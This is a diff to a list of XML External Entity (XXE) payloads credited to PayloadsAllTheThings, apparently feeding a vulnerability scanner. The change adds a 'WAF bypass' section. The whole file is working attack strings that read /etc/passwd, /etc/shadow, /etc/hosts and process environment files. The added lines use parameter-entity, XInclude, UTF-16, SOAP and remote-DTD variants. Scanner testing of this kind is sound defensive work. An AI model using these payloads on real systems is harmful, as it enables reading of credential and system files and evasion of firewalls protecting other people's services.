@@ -1,6 +1,6 @@
 # XML External Entity (XXE) payloads
 # Source: https://github.com/swisskyrepo/PayloadsAllTheThings
-# Total: 89 payloads
+# Total: 103 payloads
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>
@@ -92,3 +92,22 @@
 <!DOCTYPE r [<!ENTITY n "NOTSCAN_XXE">]><r>&n;</r>
 <!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><r>&xxe;</r>
 <?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
+
+# --- WAF bypass ---
+# parameter entities / OOB
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % param SYSTEM "file:///etc/hosts">%param;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///etc/hosts'>">%eval;%exfil;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://127.0.0.1:80/notscan.dtd">%dtd;]><foo/>
+<!DOCTYPE foo [<!ENTITY % a SYSTEM "file:///etc/passwd">%a;]>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe PUBLIC "-//NotScan//DTD Test//EN" "file:///etc/passwd">%xxe;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % remote SYSTEM "http://127.0.0.1:80/notscan.dtd">%remote;]><foo/>
+# XInclude
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/hosts"/></root>
+# SOAP / encodings / nesting
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "notscan"><!ENTITY b "&a;">]><foo>&b;</foo>
+<?xml version="1.0"?><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
